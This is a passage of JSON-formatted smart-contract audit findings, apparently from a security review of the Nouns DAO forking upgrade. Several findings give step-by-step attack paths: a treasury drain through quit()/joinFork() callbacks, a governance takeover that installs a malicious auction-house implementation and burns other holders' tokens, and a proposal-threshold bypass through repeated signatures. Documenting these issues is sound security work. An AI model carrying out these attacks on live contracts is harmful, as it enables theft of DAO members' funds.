tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); } >> uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } 6. Forked treasury is 2 stETH and 150 ETH, cBob calls quit() again without reentering (say on zero original nouns balance condition), obtains 1 stETH and 75 ETH, the same is left for Alice. Bob stole 25 ETH from Alice. 16 Attacking function logic can be as simple as {quit() as long as there is forkedNoun on my balance, perform joinFork() on the callback as long as there is noun on my balance}. Alice lost a part of treasury funds. The scale of the steps above can be increased to drain more significant value in absolute terms. Per low likelihood and high principal funds loss impact setting the severity to be medium.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can mint arbitrary fork DAO tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The original DAO is assumed to be honest during the fork period which is reinforced in the protocol by preventing it from executing any malicious proposals during that time. Fork joiners are minted fork DAO tokens by the original DAO via claimDuringForkPeriod() which enforces the fork period on the fork DAO side. However, the notion of fork period is different on the fork DAO compared to the original DAO (as described in Issue 16), i.e. while original DAO excludes forkEndTimestamp from the fork period, fork DAO includes forkingPeriodEndTimestamp in its notion of the fork period. If the original DAO executes a malicious proposal exactly in the block at forkEndTimestamp which makes a call to claimDuringForkPeriod() to mint arbitrary fork DAO tokens then the proposal will succeed on the original DAO side because it is one block beyond its notion of fork period. The claimDuringForkPeriod() will succeed on the fork DAO side because it is in the last block in its notion of fork period. The original DAO therefore can successfully mint arbitrary fork DAO tokens which can be used to: 1) brick the fork DAO when those tokens are attempted to be minted via auctions later or 2) manipulate the fork DAO governance to steal its treasury funds. In PoS, blocks are exactly 12 seconds apart. With forkEndTimestamp = block.timestamp + ds.forkPeriod; and ds.forkPeriod now set to 7 days, forkEndTimestamp is exactly 50400 blocks (7*24*60*60/12) after the block in which executeFork() was executed. A malicious DAO can coordinate to execute such a proposal exactly in that block. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Inattentive fork escrowers may lose funds to fork quitters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Fork escrowers already have their original DAO treasury pro rate funds transferred to the fork DAO treasury (when fork executes) and are expected to claimFromEscrow() after fork executes to mint their fork DAO tokens and thereby lay claim on their pro rata share of fork DAO treasury for governance or exiting. Inattentive fork escrowers who fail to do so will force a delayed governance of 30 days (currently proposed value) on the fork DAO and beyond that will allow fork DAO members to quit with a greater share of the fork DAO treasury because fork execution transfers all escrowers' original DAO treasury funds to fork DAO treasury. 18 Inattentive slow-/non-claiming fork escrowers may lose funds to quitters if they do not claim their fork DAO tokens before its governance is active in 30 days after fork executes. They will also be unaccounted for in DAO functions like quorum and proposal threshold. While we would expect fork escrowers to be attentive and claim their fork DAO tokens well within the delayed governance period, the protocol design can be more defensive of slow-/non-claimers by protecting their funds on the fork DAO from quitters. Low likelihood + High impact = Medium severity. Consider be",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Upgrading timelock without transferring the nouns from old timelock balance will increase adjusted total supply",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "There is one noun on timelock V1 balance, and can be others as of migration time:  etherscan.io/token/0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03?a=0x0BC3807Ec262cB779b38D65b38158acC3bfedE10 Changing ds.timelock without nouns transfer will increase adjusted total supply:  NounsDAOV3Fork.sol#L199-L201 function adjustedTotalSupply(NounsDAOStorageV3.StorageV3 storage ds) internal view returns (uint256) { return ds.nouns.totalSupply() - ds.nouns.balanceOf(address(ds.timelock)) - ,! ds.forkEscrow.numTokensOwnedByDAO(); ,! } As of time of this writing adjustedTotalSupply() will be increased by 1 due to treasury token reclassification, the upgrade will cause a (13470 + 14968) * 1733.0 * (1 / 742 - 1 / 743) = 89 USD loss per noun or (13470 + 14968) * 1733.0 / 743 = 66330 USD cumulatively for all nouns holders. Per high likelihood and low impact setting the severity to be medium.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fork escrowers can exploit the fork or force late joiners to quit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Based in the current supply of Nouns and the following parameters that will be used during the upgrade to V3:  Nouns total supply: 743  forkThresholdBPS_: 2000 (20%)  forkThreshold: 148, hence 149 Nouns need to be escrowed to be able to call executeFork() The following attack vector would be possible: 1. Attacker escrows 75 tokens. 2. Bob escrows 74 tokens to reach the forkThreshold. 3. Bob calls executeFork() and claimFromEscrow(). 4. Attacker calls claimFromEscrow() right away. As now nouns.remainingTokensToClaim() is zero the gover- nance is now active and proposals can be created. 5. Attacker creates a malicious proposal. Currently the attacker has 75 Nouns and Bob 74 in the fork. This means that the attacker has the majority of the voting power and whatever he proposes can not be denied.  NounsForkToken.getPriorVotes(attacker, <proposalCreationBlock>) -> 75  NounsForkToken.getPriorVotes(Bob , <proposalCreationBlock>) -> 74 6. The proposal is created with the following description: \"Proposal created to upgrade the NounsAuction- HouseFork to a new implementation similar to the main NounsAuctionHouse\". The attacker deploys this new implementation and simply performs the following change in the code: modifier initializer() { - + require(_initializing || !_initialized, \"Initializable: contract is already initialized\"); require(!_initializing || _initialized, \"Initializable: contract is already initialized\"); bool isTopLevelCall = !_initializing; if (isTopLevelCall) { _initializing = true; _initialized = true; } _; if (isTopLevelCall) { _initializing = false; } } The proposal is created with the following data: targets[0] = address(contract_NounsAuctionHouseFork); values[0] = 0; signatures[0] = 'upgradeTo(address)'; calldatas[0] = abi.encode(address(contract_NounsAuctionHouseForkExploitableV1)); 7. Proposal is created and is now in Pending state. During the next days, users keep joining the fork increasing the funds of the fork treasury as the fork period is still active. 8. 5 days later proposal is in Active state and the attacker votes to pass it. Bob, who does not like the proposal, votes to reject it. 20  quorumVotes: 14  forVotes: 75  againstVotes: 74 9. As the attacker and Bob were the only users that had any voting power at the time of proposal creation, five days later, the proposal is successful. 10. Proposal is queued. 11. 3 weeks later proposal is executed. 12. The NounsAuctionHouseFork contract is upgraded to the malicious version and the attacker re-initialize it and sets himself as the owner: contract_NounsAuctionHouseFork.initialize(attacker, NounsForkToken, <WETH address>, 0, 0, 0, 0) 13. Attacker, who is now the owner, upgrades the NounsAuctionHouseFork contract, once again, to a new im- plementation that implements the following function: function burn(uint256[] memory _nounIDs) external onlyOwner{ for (uint256 i; i < _nounIDs.length; ++i){ nouns.burn(_nounIDs[i]); } } 14. Attacker now, burns all the Nouns Tokens in the fork except the ones that he owns. 15. Attacker calls quit() draining the whole treasury: NounsTokenFork.totalSupply() -> 75 attacker.balance -> 0 contract_stETH.balanceOf(attacker) -> 0 forkTreasury.balance -> 2005_383580080753701211 contract_stETH.balanceOf(forkTreasury) -> 2005_383580080753701210 attacker calls -> contract_NounsDAOLogicV1Fork.quit([0, ... 74]) attacker.balance -> 2005_383580080753701211 contract_stETH.balanceOf(attacker) -> 2005_383580080753701208 forkTreasury.balance -> 0 contract_stETH.balanceOf(forkTreasury) -> 1 Basically, the condition that should be met for this exploit is that at the time of proposal creation the attacker has If this happens, users will be more than 51% of the voting power. This is more likely to happen in small forks. forced to leave or be exploited. As there is no vetoer role, noone will be able to stop this type of proposals.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Including non-standard ERC20 tokens will revert and prevent forking/quitting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "If erc20TokensToIncludeInFork or erc20TokensToIncludeInQuit accidentally/maliciously include non-confirming ERC20 tokens, such as USDT, which do not return a boolean value on transfers then sendProRata- Treasury() and quit() will revert because it expects timelock.sendERC20() to return true from the underlying ERC20 transfer call. The use of transfer() instead of safeTransfer() allows this scenario. Low likelihood + High impact = Medium severity. Inclusion of USDT-like tokens in protocol will revert sendProRataTreasury() and quit() to prevent forking/quitting.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Changing voteSnapshotBlockSwitchProposalId after it was set allows for votes double counting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Now ds.voteSnapshotBlockSwitchProposalId can be changed after it was once set to the next proposal id, there are no restrictions on repetitive setting. In the same time, proposal votes are counted without saving the additional information needed to reconstruct the timing and voteSnapshotBlockSwitchProposalId moved forward as a result of such second _setVoteSnap- shotBlockSwitchProposalId() call will produce a situation when all the older, already cast, votes for the propos- als with old_voteSnapshotBlockSwitchProposalId <= id < new_voteSnapshotBlockSwitchProposalId will be counted as of proposal.startBlock, while all the never, still to be casted, votes for the very same proposals will be counted as of proposal.creationBlock. Since the voting power of users can vary in-between these timestamps, this will violate the equality of voting conditions for all such proposals. Double counting will be possible and total votes greater than total supply can be cast this way: say Bob has transferred his nouns to Alice between proposal.startBlock and pro- posal.creationBlock, Alice voted before the change, Bob voted after the change. Bob's nounces will be counted twice. Severity is medium: impact looks to be high, a violation of equal foot voting paves a way for voting manipulations, but there is a low likelihood prerequisite of passing a proposal for the second update for the voteSnapshotBlock- SwitchProposalId. The latter can happen as a part of bigger pack of changes. _setVoteSnapshotBlockSwitch- ProposalId() call do not have arguments and by itself repeating it doesn't look incorrect.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Key fork parameters are set outside of proposal flow, while aren't being controlled in the code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "These configuration parameters are crucial for fork workflow and new DAO logic, but aren't checked when being set in ForkDAODeployer's constructor:  ForkDAODeployer.sol#L31-L81 contract ForkDAODeployer is IForkDAODeployer { ... constructor( address tokenImpl_, address auctionImpl_, address governorImpl_, address treasuryImpl_, uint256 delayedGovernanceMaxDuration_, uint256 initialVotingPeriod_, uint256 initialVotingDelay_, uint256 initialProposalThresholdBPS_, uint256 initialQuorumVotesBPS_ ) { } ... delayedGovernanceMaxDuration = delayedGovernanceMaxDuration_; initialVotingPeriod = initialVotingPeriod_; initialVotingDelay = initialVotingDelay_; initialProposalThresholdBPS = initialProposalThresholdBPS_; initialQuorumVotesBPS = initialQuorumVotesBPS_; While most parameters are set via proposals directly and are controlled in the corresponding setters, these 5 variables are defined only once on ForkDAODeployer construction and neither per se visible in proposals, as ForkDAODeployer is being set as an address there, nor being controlled within the corresponding setters this way. Their values aren't controlled on construction either. 23  NounsDAOLogicV3.sol#L820-L840 /** * @notice Admin function for setting the fork related parameters * @param forkEscrow_ the fork escrow contract * @param forkDAODeployer_ the fork dao deployer contract * @param erc20TokensToIncludeInFork_ the ERC20 tokens used when splitting funds to a fork * @param forkPeriod_ the period during which it's possible to join a fork after exeuction * @param forkThresholdBPS_ the threshold required of escrowed nouns in order to execute a fork */ function _setForkParams( address forkEscrow_, address forkDAODeployer_, address[] calldata erc20TokensToIncludeInFork_, uint256 forkPeriod_, uint256 forkThresholdBPS_ ) external { ds._setForkEscrow(forkEscrow_); ds._setForkDAODeployer(forkDAODeployer_); ds._setErc20TokensToIncludeInFork(erc20TokensToIncludeInFork_); ds._setForkPeriod(forkPeriod_); ds._setForkThresholdBPS(forkThresholdBPS_); }  NounsDAOV3Admin.sol#L484-L495 /** * @notice Admin function for setting the fork DAO deployer contract */ function _setForkDAODeployer(NounsDAOStorageV3.StorageV3 storage ds, address newForkDAODeployer) external onlyAdmin(ds) address oldForkDAODeployer = address(ds.forkDAODeployer); ds.forkDAODeployer = IForkDAODeployer(newForkDAODeployer); emit ForkDAODeployerSet(oldForkDAODeployer, newForkDAODeployer); { } Impact: an setting example, delayedGovernanceMaxDuration = 0 As bypasses NounsDAOLogicV1Fork's checkGovernanceActive() control and allows for stealing the whole treasury of a new forked DAO with executeFork() NounsTokenFork.claimFromEscrow() -> NounsDAOLogicV1Fork.quit() deployment transaction. An attacker will be entitled to 1 / 1 = 100% of the new DAO funds being the only one who claimed. back-running call Setting medium severity per low likelihood and high impact of misconfiguration, which can happen both as an operational mistake or be driven by a malicious intent.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can hold token holders captive by setting forkPeriod to an unreasonably low value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "A malicious majority can reduce the number of Noun holders joining an executed fork by setting the forkPeriod to an unreasonably low value, e.g. 0, because there is no MIN_FORK_PERIOD enforced (MAX is 14 days). This in combination with an unreasonably high forkThresholdBPS (no min/max enforced) will allow a malicious majority to hold captive those minority Noun holders who missed the fork escrow window, cannot join the fork in the unreasonably small fork period and do no have sufficient voting power to fork again. While the accidental setting of the lower bound to an undesirable value poses a lower risk than that of the upper bound, this is yet another vector of attack by a malicious majority on forking capability/effectiveness. While the majority can upgrade the DAO entirely at will to circumvent all such guardrails, we hypothesise that would get more/all attention by token holders than modification of governance/fork parameters whose risk/impact may not be apparent immediately to non-technical or even technical holders. So unless there is an automated impact review/analysis performed as part of governance processes, such proposal vectors on governance/forking parameters should be considered as posing non-negligible risk. Impact: Inattentive minority Noun holders are unable to join the fork and forced to stick with the original DAO. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can prevent forking by manipulating the forkThresholdBPS value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "While some of the documentation, see 1 and 2, note that the fork threshold is expected to be 20%, the forkThresholdBPS is a DAO governance controlled value that may be modified via _setForkThresholdBPS(). A malicious majority can prevent forking at any time by setting the forkThresholdBPS to an unreasonably high value that is >= majority voting power. For a fork that is slowly gathering support via escrowing (thus giving time for a DAO proposal to be executed) , a malicious majority can reactively manipulate forkThresholdBPS to prevent that fork from being executed. While the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties and their impacts. Token holders need to actively monitor all proposals for malicious updates to create, execute and join a fork before such a proposal takes effect. A malicious majority can prevent a minority from forking by manipulating the forkThresholdBPS value. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can prevent/deter token holders from executing/joining a fork by including arbi- trary addresses in erc20TokensToIncludeInFork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "As motivated in the fork spec, forking is a minority protection mechanism that should always allow a group of minority token holders to exit together into a new instance of Nouns DAO. in the (modifiable original DAO may a malicious majority in However, erc20TokensToIncludeInFork on balanceOf() or transfer() calls to prevent token holders from executing or joining a fork. While the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates to create, execute and join a fork before such a proposal takes effect. _setErc20TokensToIncludeInFork()) addresses revert arbitrary include that via Furthermore, a forking token holder may not necessarily want to receive all the DAO's ERC20 tokens in their new fork DAO for various reasons. For e.g., custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions and so they may not want to interact with a DAO whose treasury holds such tokens and may send them at some point (e.g. rage quit). Minority token holders may even want to fork specifically because of an ERC20's presence or proposed inclusion in the DAO treasury. Giving forking holders a choice of ERC20s to take to fork DAO gives them a choice to fork anytime only with ETH and a subset of approved tokens if the DAO has already managed to add malicious/contentious ERC20s in the list. 1. A malicious DAO can prevent unsuspecting/inattentive or future token holders from forking and taking out their pro rata funds, which is the main motivation for minority protection as specified. 2. A forking token holder is forced to end up with a fork DAO treasury that has all the original DAO's ERC20 tokens without having a choice, which may deter them from creating/executing/joining a fork in the first place. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious new DAO can prevent/deter token holders from rage quitting by including arbitrary addresses in erc20TokensToIncludeInQuit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "As described in the fork spec: \"New DAOs are deployed with vanilla ragequit in place; otherwise it's possible for a new DAO majority to collude to hurt a minority, and the minority wouldn't have any last resort if they can't reach the forking threshold; furthermore bullies/attackers can recursively chase minorities into fork DAOs in an undesired attrition war.\". However, a malicious new DAO may include arbitrary addresses in erc20TokensToIncludeInQuit (modifiable via _setErc20TokensToIncludeInQuit()) that revert on balanceOf() or transfer() calls to prevent token holders from rage quitting. While the governance process gives an opportunity to detect and block such malicious pro- posals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates and rage quit before such a proposal takes effect. Furthermore, a rage quitting token holder may not necessarily want to receive all the DAO's ERC20 tokens for various reasons. For e.g., custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions. (1) A malicious new DAO can prevent unsuspecting/inattentive token holders from rage quitting and taking out their pro rata funds, which is a critical capability for minority protection as specified. (2) A rage quitting token holder is forced to receive all the DAO's ERC20 tokens without having a choice, which may deter them from quitting.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing check for vetoed proposal's target timelock can cancel transactions from other proposals on new DAO treasury",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "veto() always assumes that the proposal being vetoed is targeting ds.timelock (i.e. the new DAO treasury) instead of checking via getProposalTimelock() as done by queue(), execute() and cancel() functions. If the proposal being vetoed were targeting timelockV1 (i.e. original DAO treasury) then this results in calling cancelTransaction() on the wrong timelock which sets queuedTransactions[txHash] to false for values of target, value, signature, data and eta. The proposal state is vetoed with zombie queued transactions on timelockV1 which will never get executed. But if there coincidentally were valid transactions with the same values (of target, value, signature, data and eta) from other proposals queued (assuming in the same block and that both timelocks have the same delay so that eta is the same) on ds.timelock then those would unexpectedly and incorrectly get dequeued and will not be executed even when these other ds.timelock targeting proposals were neither vetoed nor cancelled. Successfully voted proposals on new DAO treasury have their transactions cancelled before execution. Nouns- Confirmed with PoC: veto_poc.txt Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk NounsDAOV3Proposals.sol#L435 NounsDAOV3Proposals.sol#L527-L544"
        ]
    },
    {
        "title": "Proposal threshold can be bypassed through the proposeBySigs() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The function proposeBySigs() allows users to delegate their voting power to a proposer through signatures so the proposer can create a proposal. The only condition is that the sum of the signers voting power should be higher than the proposal threshold. In the line uint256 proposalId = ds.proposalCount = ds.proposalCount + 1;, the ds.proposalCount is in- creased but the proposal has not been created yet, meaning that the NounsDAOStorageV3.Proposal struct is, at this point, uninitialized, so when the checkNoActiveProp() function is called the proposal state is DEFEATED. As the proposal state is DEFEATED the checkNoActiveProp() call would not revert in the case that a signer is repeated in the NounsDAOStorageV3.ProposerSignature[] array: function checkNoActiveProp(NounsDAOStorageV3.StorageV3 storage ds, address proposer) internal view { uint256 latestProposalId = ds.latestProposalIds[proposer]; if (latestProposalId != 0) { NounsDAOStorageV3.ProposalState proposersLatestProposalState = state(ds, latestProposalId); if ( proposersLatestProposalState == NounsDAOStorageV3.ProposalState.ObjectionPeriod || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Active || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Pending || proposersLatestProposalState == NounsDAOStorageV3.ProposalState.Updatable ) revert ProposerAlreadyHasALiveProposal(); } } Because of this it is possible to bypass the proposal threshold and create any proposal by signing multiple pro- poserSignatures with the same signer over and over again. This would keep increasing the total voting power accounted by the smart contract until this voting power is higher than the proposal threshold. Medium likelihood + Medium Impact = Medium severity. Consider NounsDAOStor-",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Attacker can utilize bear market conditions to profit from forking the Nouns DAO",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "An economic attack vector has been identified that could potentially compromise the integrity of the Nouns DAO treasury, specifically due to the introduction of forking functionality. Currently, the treasury holds approximately $24,745,610.99 in ETH and about $27,600,000 in STETH. There are roughly 738 nouns tokens. As per OpenSea listings, the cheapest nouns-token can be purchased for about 31 ETH, approximately $53,000. Meanwhile, the daily auction price for the nouns stands at approximately 28 ETH, which equals about $48,600. A prospective attacker may exploit the current bear market conditions, marked by discounted price, to buy multiple nouns-tokens at a low price, execute a fork to create a new DAO and subsequently claim a portion of the treasury. This act would result in the attacker gaining more than they invested at the expense of the Nouns DAO treasury. To illustrate, if the forking threshold is established at 20%, an attacker would need 148 nouns to execute a fork. Consider the scenario where a user purchases 148 nouns for a total of 4588 ETH (148 x 31 ether). The fork- Treasury.balance would be 2679.27 ETH, and the contract_stETH.balanceOf(forkTreasury) would stand at 3000.7 ETH. The total ETH obtained would amount to 5680.01 ETH, thereby yielding a profit of 1092 ETH ($2,024,568).",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Setting NounsAuctionHouse's timeBuffer too big is possible, which will freeze bidder's funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "It's now possible to set timeBuffer to an arbitrary big value with setTimeBuffer(), there is no control:  NounsAuctionHouse.sol#L161-L169 /** * @notice Set the auction time buffer. * @dev Only callable by the owner. */ function setTimeBuffer(uint256 _timeBuffer) external override onlyOwner { timeBuffer = _timeBuffer; emit AuctionTimeBufferUpdated(_timeBuffer); } This can freeze user funds as NounsAuctionHouse holds current bid, but the its release in conditional to block.timestamp >= _auction.endTime:  NounsAuctionHouse.sol#L96-L98 function settleAuction() external override whenPaused nonReentrant { _settleAuction(); } 29  NounsAuctionHouse.sol#L221-L234 function _settleAuction() internal { INounsAuctionHouse.Auction memory _auction = auction; require(_auction.startTime != 0, \"Auction hasn't begun\"); require(!_auction.settled, 'Auction has already been settled'); require(block.timestamp >= _auction.endTime, \"Auction hasn't completed\"); >> auction.settled = true; if (_auction.bidder == address(0)) { nouns.burn(_auction.nounId); } else { nouns.transferFrom(address(this), _auction.bidder, _auction.nounId); } Which can be set to be arbitrary big value, say 106 years, effectively freezing current bidder's funds:  NounsAuctionHouse.sol#L104-L129 function createBid(uint256 nounId) external payable override nonReentrant { ... // Extend the auction if the bid was received within `timeBuffer` of the auction end time bool extended = _auction.endTime - block.timestamp < timeBuffer; if (extended) { >> auction.endTime = _auction.endTime = block.timestamp + timeBuffer; } I.e. permissionless settleAuction() mechanics will be disabled. Current bidder's funds will be frozen for an arbitrary time. As the new setting needs to pass voting, the probability is very low. In the same time it is higher for any forked DAO than for original one, so, while the issue is present in the V1 and V2, it becomes more severe in V3 in the context of the forked DAO. The impact is high, being long-term freeze of the bidder's native tokens.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Veto renouncing in the original DAO or rage quit blocking in a forked DAO as a result of any future proposals will open up the way for 51% attacks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "It is possible to renounce veto power in V1, V2 and V3 versions of the protocol or upgrade forked V1 to block or remove rage quit. While it is a part of standard workflow, these operations are irreversible and open up a possibility of all variations of 51% attack. As a simplest example, in the absence of veto functionality a majority can introduce and execute a proposal to move all DAO treasury funds to an address they control. Also, there is a related vector, incentivized bad faith voting. _burnVetoPower() exists in V1, V2 and V3: In NounsDAOLogicV1 : 30 /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower() public { // Check caller is pendingAdmin and pendingAdmin require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); address(0) _setVetoer(address(0)); } In NounsDAOLogicV2: /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower() public { // Check caller is vetoer require(msg.sender == vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); // Update vetoer to 0x0 emit NewVetoer(vetoer, address(0)); vetoer = address(0); // Clear the pending value emit NewPendingVetoer(pendingVetoer, address(0)); pendingVetoer = address(0); } In NounsDAOLogicV3: /** * @notice Burns veto priviledges * @dev Vetoer function destroying veto power forever */ function _burnVetoPower(NounsDAOStorageV3.StorageV3 storage ds) public { // Check caller is vetoer require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only'); // Update vetoer to 0x0 emit NewVetoer(ds.vetoer, address(0)); ds.vetoer = address(0); // Clear the pending value emit NewPendingVetoer(ds.pendingVetoer, address(0)); ds.pendingVetoer = address(0); } Also, veto() was removed from NounsDAOLogicV1Fork, and the only mitigation to the same attack is rage quit():  NounsDAOLogicV1Fork.sol#L195-L222 31 /** * @notice A function that allows token holders to quit the DAO, taking their pro rata funds, * and sending their tokens to the DAO treasury. * Will revert as long as not all tokens were claimed, and as long as the delayed governance has not expired. ,! * @param tokenIds The token ids to quit with */ function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); } uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } in as an this that example function, any malfunction to forked nouns holders was previously black-listed there will be no way to stop any This means erc20TokensToIncludeInQuit, while a minority of by USDC contract, will open up the possibility of majority attack on them, i.e. majority backed malicious proposal from affecting the DAO held funds of such holders. Nouns holders that aren't aware enough of the importance of functioning veto() for original DAO and quit() for the forked DAO, can pass a proposal that renounce veto or [fully or partially] block quit(), enabling the 51% attack. Such change will be irreversible and if a majority forms and acts before any similar mitigation functionalities be reinstalled, the whole DAO funds of the rest of the holders can be lost. Per very low likelihood (which increases with the switch from veto() to quit() as a safeguard), and high funds loss impact, setting the severity to be low. if USDC is added",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "The try-catch block at NounsAuctionHouseFork will only catch errors that contain strings",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "This issue has been previously identified and documented in the Nouns Builder Code4rena Audit. The catch Error(string memory) within the try/catch block in the _createAuction function only catches re- verts that include strings. At present, in the current version of the NounsAuctionHouseFork there are not reverts without a string. But, given the fact that the NounsAuctionHouseFork and the NounsTokenFork contracts are meant to be upgrad- able, if a future upgrade in the NounsTokenFork:mint() replaces the require statements with custom errors, the existing catch statement won't be able to handle the reverts, potentially leading to a faulty state of the contract. Here's an example illustrating that the catch Error(string memory) won't catch reverts with custom errors that don't contain strings: contract Test1 { bool public error; Test2 test; constructor() { test = new Test2(); } function testCustomErr() public{ try test.revertWithRevert(){ } catch Error(string memory) { error = true; } } function testRequire() public{ try test.revertWithRequire(){ } catch Error(string memory) { error = true; } } } contract Test2 { error Revert(); function revertWithRevert() public{ revert Revert(); } function revertWithRequire() public { require(true == false, \"a\"); } }",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Private keys are read from the .env environment variable in the deployment scripts",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
